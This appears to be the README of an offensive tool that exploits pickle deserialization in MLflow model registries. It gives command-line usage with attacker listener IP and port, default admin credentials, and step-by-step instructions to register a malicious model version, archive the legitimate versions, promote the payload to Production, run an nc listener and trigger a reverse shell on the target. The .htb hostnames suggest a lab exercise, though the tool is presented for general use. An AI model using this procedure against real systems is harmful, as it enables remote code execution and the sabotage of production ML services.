# MLflow Pickle RCE

A tool for exploiting Python pickle deserialization in MLflow model registries.

## How It Works

MLflow serializes `PythonModel` objects using pickle. When a model is loaded for inference, Python deserializes the pickle file — executing any code embedded via `__reduce__`. By registering a malicious model version and promoting it to Production, any subsequent call to `mlflow.pyfunc.load_model()` on the target triggers the payload.

```
Attacker registers malicious pickle as a model version
              ↓
Target app calls load_model() to run inference
              ↓
Pickle deserializes → __reduce__ executes
              ↓
Reverse shell
```

This technique works on any MLflow version that uses PythonModel (1.x, 2.x, 2.14.x tested).

---

## Requirements

```bash
pip install mlflow requests
```

---

## Usage

```
python3 mlflow_pickle_rce.py -t <target> -l <lhost> -p <lport> [options]

Required:
  -t, --target      MLflow base URL (e.g. http://models.target.htb)
  -l, --lhost       Your listener IP (tun0)
  -p, --lport       Your listener port

Optional:
  -u, --user        MLflow username (default: admin)
  -P, --password    MLflow password (default: password)
  -m, --model       Target model name (auto-detected if omitted)
  --stage           Stage to promote payload to (default: Production)
  --list-models     List registered models and exit
```

### Examples

```bash
# Auto-detect model, use default credentials
python3 mlflow_pickle_rce.py -t http://models.target.htb -l 192.168.1.250 -p 4444

# Target a specific model name
python3 mlflow_pickle_rce.py -t http://models.target.htb -l 192.168.1.250 -p 4444 \
  -u admin -P password -m my-classifier

# Enumerate registered models first
python3 mlflow_pickle_rce.py -t http://models.target.htb -l 192.168.1.250 -p 4444 \
  --list-models
```

---

## Execution Steps

**1. Enumerate the target**

Check what models are registered and which one the app actively uses:
```bash
python3 mlflow_pickle_rce.py -t http://<target> -l <lhost> -p <lport> --list-models
```

Look at the app UI or API to identify the active model name.

**2. Make sure a model exists in the registry**

The app must have at least one registered model before the exploit can overwrite it. If the registry is empty, trigger whatever action on the target app creates a model (e.g. a "Train Model" button), then proceed.

**3. Run the exploit**

```bash
python3 mlflow_pickle_rce.py -t http://<target> -l <lhost> -p <lport> -m <model_name>
```

The exploit will:
- Register the malicious pickle as a new version of the target model
- Archive all existing versions
- Promote the payload to Production

**4. Start your listener**

```bash
nc -lvnp <lport>
```

**5. Trigger inference on the target app**

Submit a prediction request — upload a file, hit an API endpoint, or wait for an automated job. Anything that causes the app to call `load_model()` will fire the shell.

---

## MLflow Version Compatibility

The pickle payload itself is version-agnostic. Only the stage promotion API differs in MLflow 3.x.

---
